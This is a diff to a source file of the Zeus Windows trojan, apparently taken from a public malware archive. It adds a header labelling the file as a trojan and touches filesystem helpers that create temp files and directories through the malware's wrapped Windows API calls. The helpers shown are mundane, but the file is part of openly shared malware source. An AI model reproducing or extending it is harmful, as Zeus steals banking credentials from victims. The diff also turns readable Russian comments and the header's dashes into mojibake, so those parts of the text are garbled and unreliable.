@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <aclapi.h>
 #include <shlwapi.h>
@@ -158,7 +169,7 @@ bool Fs::_removeFile(LPWSTR file)
 bool Fs::_createTempFile(const LPWSTR prefix, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
   
   if(i > 0 && i <= MAX_PATH - 14)
   {
@@ -171,7 +182,7 @@ bool Fs::_createTempFile(const LPWSTR prefix, LPWSTR buffer)
 bool Fs::_createTempFileEx(const LPWSTR prefix, const LPWSTR extension, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
 
   if(i > 0 && i <= MAX_PATH - 14)
   {
@@ -191,7 +202,7 @@ bool Fs::_createTempFileEx(const LPWSTR prefix, const LPWSTR extension, LPWSTR b
 bool Fs::_createTempDirectory(const LPWSTR prefix, LPWSTR buffer)
 {
   WCHAR path[MAX_PATH];
-  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*требование GetTempFileName*/, path);
+  DWORD i = CWA(kernel32, GetTempPathW)(MAX_PATH - 14/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetTempFileName*/, path);
 
   if(i > 0 && i <= MAX_PATH - 14)
   {
